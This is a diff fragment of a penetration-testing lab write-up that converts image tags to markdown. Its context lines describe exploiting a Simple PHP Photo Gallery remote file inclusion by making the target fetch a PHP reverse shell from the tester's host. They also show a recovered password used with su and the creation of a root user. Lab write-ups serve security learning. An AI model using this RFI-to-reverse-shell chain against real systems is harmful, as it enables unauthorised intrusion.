@@ -28,7 +28,7 @@ Lots of ports open.
 
 Port 80 was running a Simple PHP Photo Gallery instance:
 
-<figure><img src="../../../.gitbook/assets/image (1533).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1533).png>)
 
 This thing might be vulnerable to an RFI based on `searchsploit`:
 
@@ -51,11 +51,11 @@ The PoC is quite simple to test:
 
 And it does work since I can make the website send requests to my HTTP server:
 
-<figure><img src="../../../.gitbook/assets/image (3536).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3536).png>)
 
 To exploit this, we can just host a PHP reverse shell from PentestMonkey and make the website call it by visiting [http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php](http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php).
 
-<figure><img src="../../../.gitbook/assets/image (4007).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4007).png>)
 
 ## Privilege Escalation
 
@@ -124,7 +124,7 @@ HockSydneyCertify123
 
 Then, just use `su`:
 
-<figure><img src="../../../.gitbook/assets/image (2884).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2884).png>)
 
 Grab the user flag.
 
@@ -139,6 +139,6 @@ Grab the user flag.
 
 Using this, we can easily create a new root user.
 
-<figure><img src="../../../.gitbook/assets/image (3978).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3978).png>)
 
 Rooted!
